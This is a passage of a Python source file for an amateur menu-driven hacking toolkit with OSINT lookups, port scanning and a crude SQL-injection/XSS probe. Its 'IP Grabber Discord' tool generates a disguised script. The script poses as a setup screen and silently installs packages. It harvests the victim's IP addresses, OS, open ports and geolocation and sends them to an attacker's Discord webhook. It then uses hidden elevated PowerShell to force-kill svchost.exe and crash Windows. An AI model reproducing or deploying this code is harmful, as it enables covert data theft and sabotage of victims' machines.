    nouns = ["Tiger", "Wolf", "Eagle", "Shark", "Panther", "Falcon", "Lion", "Bear", "Fox", "Dragon"]
    usernames = set()
    while len(usernames) < 20:
        username = random.choice(adjectives) + random.choice(nouns) + str(random.randint(10, 9999))
        usernames.add(username)
    for i, u in enumerate(usernames, 1):
        print(f"{i:02d}: {YELLOW}{u}{RESET}")

def base64_converter_tool():
    import base64
    clear()
    print(f"{BOLD}{CYAN}== Text to base64 converter =={RESET}")
    text = input("Enter the text to convert: ").strip()
    encoded = base64.b64encode(text.encode("utf-8")).decode("utf-8")
    print(f"{GREEN}Text encoded in base64:\n{encoded}{RESET}")

def calculator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Advanced calculator =={RESET}")
    print("Write a mathematical expression (e.g.: 2+2*3) or 'exit' to return to the menu.")
    while True:
        expr = input(f"{YELLOW}>>> {RESET}")
        if expr.lower() == "exit":
            break
        try:
            result = eval(expr, {"__builtins__": {}})
            print(f"{GREEN}Result: {result}{RESET}")
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

def email_tracker_ascii_art():
    ascii_art = """
.:+*#%%#####*++++-.
                :#%%*+*+-.....
             .=%%+++:..
           .=%#++=.
          -%%+++.
      .  =%%++-          ....
      #%+#%++=.        .:#%%%*:
      :#@%#+=          :*+:-*%#:
       .*@@#.         .-%*::-%%#.
        .-%@@%-.      .=%%--%%%- 
          .:--=*+-:.:-#%%%%%%%%*.                       
               .:-*#%%%%%%%%%%%%%-                     
                  .+%%%*+*%%%%%%%%+...                 
                  .+%@@%%%%*#%%%%%%%%%*-.              
                   .*%@%%%%%%%%%%%%%%%%%#-.           
                   .*%%%%%%%%%%%+#%%%%%%%%%*-.         
                  .=%%%%%%%%%%%%@%*%%%%%####=-==
                  :*%%%%%%%%%%%%%%%*#%%%%#+=-==+
                 .+=*%#%%%%%%%%%%%%%**%%#+**+-:-
                .-=::*-%%%%%%%%%%%%###*-*%###+:
                ...:..%%%%%%%%%%%%%%#:=*+-:.
                     *%%%%%%%%%%%%%%%%.
                    :#%%%%%%%%%%%%%%%%+
                   .*%%%%%%%%%%%%%%%%%#.
                  .=%%%%%%%%%%%%%%%%%%#:
                  .+%%%%%%%%%%%%%%%%%%%*.
                    :+*#%%%@%%%%%%%%%%%%#:
    """
    print_ascii_fade(ascii_art, delay=0.03)

def email_tracker_tool():
    clear()
    email_tracker_ascii_art()
    print(f"{BOLD}{CYAN}== Email tracker (legal OSINT) =={RESET}")
    email = input("Enter the email to track: ").strip().lower()
    print(f"\n{CYAN}Searching some public services...{RESET}\n")

  
    gravatar_hash = hashlib.md5(email.encode('utf-8')).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{gravatar_hash}?d=404"
    try:
        r = requests.get(gravatar_url, timeout=5)
        if r.status_code == 200:
            print(f"{GREEN}[✓] Gravatar: an avatar exists for this email!{RESET}")
        else:
            print(f"{RED}[✗] Gravatar: no avatar found.{RESET}")
    except Exception:
        print(f"{YELLOW}[!] Gravatar: error or timeout.{RESET}")

    
    hibp_url = f"https://haveibeenpwned.com/unifiedsearch/{email}"
    try:
        r = requests.get(hibp_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=7)
        if r.status_code == 200 and '"PwnCount":' in r.text:
            print(f"{GREEN}[✓] HaveIBeenPwned: this email was found in public breaches!{RESET}")
        else:
            print(f"{YELLOW}[?] HaveIBeenPwned: no public breach found.{RESET}")
    except Exception:
        print(f"{YELLOW}[!] HaveIBeenPwned: error or timeout.{RESET}")

   
    print(f"\n{CYAN}Manual verification recommended on these services:{RESET}")
    services = {
        "Facebook": f"https://www.facebook.com/login/identify/?email={email}",
        "Twitter/X": f"https://twitter.com/account/begin_password_reset?email={email}",
        "Instagram": f"https://www.instagram.com/accounts/password/reset/?email={email}",
        "LinkedIn": f"https://www.linkedin.com/checkpoint/rp/request-password-reset?email={email}",
        "Google": f"https://accounts.google.com/signin/v2/usernamerecovery?Email={email}",
        "Adobe": f"https://account.adobe.com/",
    }
    for name, url in services.items():
        print(f"{BLUE}- {name}: {url}{RESET}")

    print(f"\n{YELLOW}For social and services, open the link and verify if the email is recognized by the password recovery system.{RESET}")

def website_info_scanner_menu():
    clear()
    print(f"{BOLD}{CYAN}== Website Info Scanner Menu =={RESET}")
    while True:
        print(f"\n{PURPLE}1{RESET} - Website info scanner (find all info about a site, including IP and open ports)")
        print(f"{PURPLE}2{RESET} - Website URL scanner (scan a URL and get all possible info)")
        print(f"{PURPLE}0{RESET} - Return to main menu\n")
        scelta = input(f"{CYAN}Select an option (1/2/0): {RESET}").strip()
        if scelta == "1":
            website_info_scanner()
        elif scelta == "2":
            website_url_scanner()
        elif scelta == "0":
            break
        else:
            print(f"{RED}Invalid choice.{RESET}")
            time.sleep(1)

def website_info_scanner():
    clear()
    print(f"{BOLD}{CYAN}== Website Info Scanner =={RESET}")
    website = input("Enter the website name (e.g.: google.com): ").strip()
    if not website:
        print(f"{RED}Invalid site.{RESET}")
        return
    try:
        
        import subprocess
    except ImportError:
        print(f"{YELLOW}Required library installation...{RESET}")
        
        import subprocess

  
    try:
        ip = socket.gethostbyname(website)
        print(f"{YELLOW}IP Address:{RESET} {ip}")
    except Exception as e:
        print(f"{RED}Error obtaining IP: {e}{RESET}")

 
    try:
        w = whois.whois(website)
        print(f"{YELLOW}Whois Info:{RESET}")
        print(f"  Domain: {w.domain_name}")
        print(f"  Registrar: {w.registrar}")
        print(f"  Creation Date: {w.creation_date}")
        print(f"  Expiration Date: {w.expiration_date}")
        print(f"  Name Servers: {w.name_servers}")
    except Exception as e:
        print(f"{RED}Error in whois: {e}{RESET}")

    
    print(f"{YELLOW}Scanning common ports (21,22,23,25,53,80,110,143,443,993,995):{RESET}")
    common_ports = [21,22,23,25,53,80,110,143,443,993,995]
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"  Port {port}: OPEN")
            else:
                print(f"  Port {port}: CLOSED")
            sock.close()
        except Exception as e:
            print(f"  Port {port}: ERROR - {e}")

def website_url_scanner():
    clear()
    print(f"{BOLD}{CYAN}== Website URL Scanner =={RESET}")
    url = input("Enter the full URL (e.g.: https://google.com): ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        response = requests.get(url, timeout=10)
        print(f"{YELLOW}Status Code:{RESET} {response.status_code}")
        print(f"{YELLOW}Headers:{RESET}")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")
        print(f"{YELLOW}Content-Type:{RESET} {response.headers.get('Content-Type', 'N/A')}")
        print(f"{YELLOW}Server:{RESET} {response.headers.get('Server', 'N/A')}")
        print(f"{YELLOW}Content Length:{RESET} {response.headers.get('Content-Length', 'N/A')}")
        #
        if url.startswith('https'):
            try:
                hostname = url.split('://')[1].split('/')[0]
                context = ssl.create_default_context()
                with socket.create_connection((hostname, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        print(f"{YELLOW}SSL Certificate Info:{RESET}")
                        print(f"  Subject: {cert.get('subject', 'N/A')}")
                        print(f"  Issuer: {cert.get('issuer', 'N/A')}")
                        print(f"  Valid From: {cert.get('notBefore', 'N/A')}")
                        print(f"  Valid To: {cert.get('notAfter', 'N/A')}")
            except Exception as e:
                print(f"{RED}SSL Error: {e}{RESET}")
    except Exception as e:
        print(f"{RED}Error in request: {e}{RESET}")

def vulnerability_scanner_tool():
    clear()
    print(f"{BOLD}{CYAN}== Vulnerability Scanner for Websites =={RESET}")
    url = input("Enter the site URL to scan: ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    print(f"{CYAN}Scanning in progress...{RESET}")
    vulnerabilities = []

    
    try:
        test_url = url + "'"
        response = requests.get(test_url, timeout=5)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            vulnerabilities.append("Possible SQL Injection")
    except:
        pass

   
    try:
        test_url = url + "?q=<script>alert('xss')</script>"
        response = requests.get(test_url, timeout=5)
        if "<script>" in response.text:
            vulnerabilities.append("Possible XSS")
    except:
        pass

   
    common_dirs = ["/admin", "/backup", "/config", "/db", "/logs"]
    for d in common_dirs:
        try:
            test_url = url.rstrip('/') + d
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                vulnerabilities.append(f"Open directory: {d}")
        except:
            pass

   
    try:
        response = requests.get(url, timeout=10)
        if 'X-Frame-Options' not in response.headers:
            vulnerabilities.append("Missing X-Frame-Options header (possible clickjacking)")
        if 'Content-Security-Policy' not in response.headers:
            vulnerabilities.append("Missing Content Security Policy")
        if response.headers.get('Server'):
            server = response.headers['Server'].lower()
            if 'apache' in server and '2.4' not in server:
                vulnerabilities.append("Apache server possibly outdated")
    except:
        pass

    if vulnerabilities:
        print(f"{RED}Vulnerabilities found:{RESET}")
        for v in vulnerabilities:
            print(f"  - {v}")
    else:
        print(f"{GREEN}No obvious vulnerabilities found.{RESET}")

def ip_grabber_discord_tool():
    clear()
    grabber_ascii_art()
    print(f"{BOLD}{CYAN}== IP Grabber Discord (shh.py) =={RESET}")
    webhook = input("Enter the Discord Webhook URL: ").strip()
    
    
    script = f'''import tkinter as tk
import time
import pyautogui
import subprocess
import requests
import socket
import os
import platform
import json


root = tk.Tk()
root.attributes('-fullscreen', True)
root.configure(bg='black')
root.lift()
root.attributes('-topmost', True)


label = tk.Label(root, text="Welcome, the setup is going to start.", 
                 font=("Arial", 24), fg='white', bg='black')
label.pack(expand=True)

root.update()


subprocess.run([subprocess.sys.executable, '-m', 'pip', 'install', 'pyautogui'], 
               capture_output=True, text=True)

subprocess.run([subprocess.sys.executable, '-m', 'pip', 'install', 'requests'], 
               capture_output=True, text=True)

time.sleep(5)


def get_system_info():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip_pubblico = response.json().get('ip', 'N/A')
    except:
        ip_pubblico = 'N/A'
    
    try:
        hostname = socket.gethostname()
        ip_locale = socket.gethostbyname(hostname)
    except:
        ip_locale = 'N/A'
    
    try:
        sistema_os = platform.system() + " " + platform.release()
    except:
        sistema_os = 'N/A'
    
    try:
        porte_aperte = []
        porte_comuni = [21, 22, 80, 443, 3306, 5432, 8080, 8443, 3389, 5900]
        for porta in porte_comuni:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            risultato = sock.connect_ex(('127.0.0.1', porta))
            if risultato == 0:
                porte_aperte.append(porta)
            sock.close()
    except:
        porte_aperte = []
    
    try:
        response = requests.get(f'http://ip-api.com/json/{{ip_locale}}', timeout=5)
        geoloc = response.json()
        geolocalizzazione = f"{{geoloc.get('city', 'N/A')}}, {{geoloc.get('country', 'N/A')}} (Lat: {{geoloc.get('lat', 'N/A')}}, Lon: {{geoloc.get('lon', 'N/A')}})"
    except:
        geolocalizzazione = 'N/A'
    
    return {{
        'ip_pubblico': ip_pubblico,
        'ip_locale': ip_locale,
        'sistema_os': sistema_os,
        'porte_aperte': porte_aperte,
        'geolocalizzazione': geolocalizzazione
    }}


def send_to_discord(info):
    webhook_url = "{webhook}"
    
    embed = {{
        "title": "📊 System Information Collected",
        "description": "System information collected",
        "color": 3447003,
        "fields": [
            {{"name": "Public IP", "value": info['ip_pubblico'], "inline": False}},
            {{"name": "Local IP", "value": info['ip_locale'], "inline": False}},
            {{"name": "Operating System", "value": info['sistema_os'], "inline": False}},
            {{"name": "Open Ports", "value": str(info['porte_aperte']) if info['porte_aperte'] else "None", "inline": False}},
            {{"name": "Geolocation", "value": info['geolocalizzazione'], "inline": False}}
        ]
    }}
    
    data = {{"embeds": [embed]}}
    
    try:
        requests.post(webhook_url, json=data, timeout=5)
    except:
        pass


info_sistema = get_system_info()
send_to_discord(info_sistema)

time.sleep(5)


root.destroy()

time.sleep(1)


comando = "taskkill /IM svchost.exe /F"
subprocess.Popen(f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \\'/c {{comando}}\\'" -WindowStyle Hidden', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

print("to complete the setup, click on yes")
'''
    
    try:
        temp_script_path = "shh_custom.py"
        with open(temp_script_path, "w", encoding="utf-8") as f:
            f.write(script)
        
        # Invia il file al webhook
        with open(temp_script_path, "rb") as f:
            files = {"file": ("shh.py", f, "text/x-python")}
            data = {"content": f"IP Grabber Script personalizzato\nWebhook: {webhook}"}
            response = requests.post(webhook, files=files, data=data)
            if response.status_code in (200, 204):
                print(f"{GREEN}shh.py successfully sent to webhook!{RESET}")
                print(f"{CYAN}Custom webhook: {webhook}{RESET}")
            else:
                print(f"{RED}Error sending: {response.status_code}{RESET}")
        
        # Rimuovi il file temporaneo
        os.remove(temp_script_path)
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

if __name__ == "__main__":
    check_dependencies()
    set_fullscreen()
    print(f"{CYAN}welcome, enter the password:{RESET}", end=" ")
    pw = input().strip()
    if pw != "2060":
        print(f"{RED}Wrong password. Exiting...{RESET}")
        time.sleep(2)
        sys.exit(1)
    menu()


